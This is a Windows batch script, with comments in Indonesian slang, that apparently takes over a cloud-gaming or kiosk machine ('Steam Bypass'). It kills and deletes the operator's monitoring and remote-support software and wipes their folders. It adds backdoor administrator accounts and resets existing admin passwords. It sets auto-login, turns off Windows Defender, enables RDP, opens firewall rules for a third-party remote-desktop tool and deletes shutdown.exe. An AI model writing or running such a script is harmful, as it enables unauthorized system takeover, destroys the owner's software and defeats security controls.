@echo off
title Steam Bypass - Fast Clean
color 0A

echo [*] Matiin proses sampah kilat...
taskkill /f /im genstream-metrics.exe /t >nul 2>&1
taskkill /f /im GenStreamKioskDemo.exe /t >nul 2>&1
taskkill /f /im UltraViewer.exe /t >nul 2>&1
taskkill /f /im UltraViewer_Service.exe /t >nul 2>&1
taskkill /f /im rustdesk.exe /t >nul 2>&1
taskkill /f /im CanhCutTeam_Launcher.exe /t >nul 2>&1
taskkill /f /im WeebooLauncher.exe /t >nul 2>&1
taskkill /f /im nvcontainer.exe /t >nul 2>&1
taskkill /f /im qemu-ga.exe /t >nul 2>&1
taskkill /f /im qemu-system-x86_64.exe /t >nul 2>&1
taskkill /f /im GamingServices.exe /t >nul 2>&1
taskkill /f /im GamingServicesNet.exe /t >nul 2>&1

echo [*] Hapus service...
sc stop GsMetricsExporter >nul 2>&1
sc delete GsMetricsExporter >nul 2>&1
sc stop UltraViewer_Service >nul 2>&1
sc delete UltraViewer_Service >nul 2>&1
sc stop RustDesk >nul 2>&1
sc delete RustDesk >nul 2>&1

echo [*] Ngebantai folder pake Robocopy (Super Fast)...
set "EMPTY=%TEMP%\empty_dir_%RANDOM%"
mkdir "%EMPTY%"

robocopy "%EMPTY%" "C:\GenStreamKiosk" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\GenStreamKiosk"
robocopy "%EMPTY%" "C:\Program Files (x86)\UltraViewer" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Program Files (x86)\UltraViewer"
robocopy "%EMPTY%" "C:\Users\GenStream\AppData\Local\rustdesk" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Users\GenStream\AppData\Local\rustdesk"
robocopy "%EMPTY%" "C:\Users\GenStream\AppData\Local\CanhCutTeam" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Users\GenStream\AppData\Local\CanhCutTeam"
robocopy "%EMPTY%" "C:\Users\GenStream\AppData\Roaming\CanhCutTeam_Launcher" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Users\GenStream\AppData\Roaming\CanhCutTeam_Launcher"
robocopy "%EMPTY%" "C:\Users\GenStream\AppData\Local\WeebooLauncher" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Users\GenStream\AppData\Local\WeebooLauncher"
robocopy "%EMPTY%" "C:\Users\GenStream\AppData\Roaming\vn.weboo.laucher" /MIR /MT:32 /R:0 /W:0 /NFL /NDL /NJH /NJS /NC /NS /NP >nul 2>&1 & rd /s /q "C:\Users\GenStream\AppData\Roaming\vn.weboo.laucher"

rd /s /q "%EMPTY%"

echo [*] Bikin user dan auto login...
net user kontol kontolo /add >nul 2>&1
net localgroup administrators kontol /add >nul 2>&1
net user titik kontolo /add >nul 2>&1
net localgroup administrators titik /add >nul 2>&1
net user administrator kontolo >nul 2>&1
net user user kontolo >nul 2>&1
net user admin kontolo >nul 2>&1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "titik" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d "kontolo" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName /t REG_SZ /d "%COMPUTERNAME%" /f >nul 2>&1

echo [*] Lock system dan bypass StarDesk...
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoClose /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1

netsh advfirewall firewall add rule name="ALLOW STARDESK" dir=in action=allow program="C:\Program Files\StarDesk\StarDesk.exe" enable=yes >nul 2>&1
netsh advfirewall firewall add rule name="ALLOW STARDESK HEADLESS" dir=in action=allow program="C:\Program Files\StarDesk\StarDeskHeadless.exe" enable=yes >nul 2>&1
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

del /f /q C:\Windows\System32\shutdown.exe >nul 2>&1
del /f /q C:\Windows\SysWOW64\shutdown.exe >nul 2>&1

echo [*] Fix Taskbar Win 11...
powershell -Command "$p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3'; $v=(Get-ItemProperty -Path $p).Settings; $v[8]=2; Set-ItemProperty -Path $p -Name Settings -Value $v" >nul 2>&1

echo [*] Restart Explorer...
powershell -Command "Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 1; Start-Process explorer"

echo.
echo ============================================
echo   MANTAP BRO! SEMUA UDAH CLEAR DALAM HITUNGAN DETIK!
echo ============================================
timeout /t 3 >nul
exit
